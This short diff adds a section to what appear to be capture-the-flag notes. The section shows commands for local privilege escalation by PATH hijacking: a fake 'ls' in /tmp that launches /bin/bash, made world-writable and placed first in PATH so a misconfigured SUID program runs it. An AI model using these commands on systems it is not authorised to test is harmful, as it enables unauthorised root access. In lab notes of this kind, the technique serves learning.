@@ -29,3 +29,13 @@ binwalk socute.jpg
 ```
 sudo -l
 ```
+
+## Escalation with path variable (work with suid misconfiguration)
+
+```
+cd /tmp
+echo “/bin/bash” > ls
+chmod 777 ls
+echo $PATH
+export PATH=/tmp:$PATH
+```
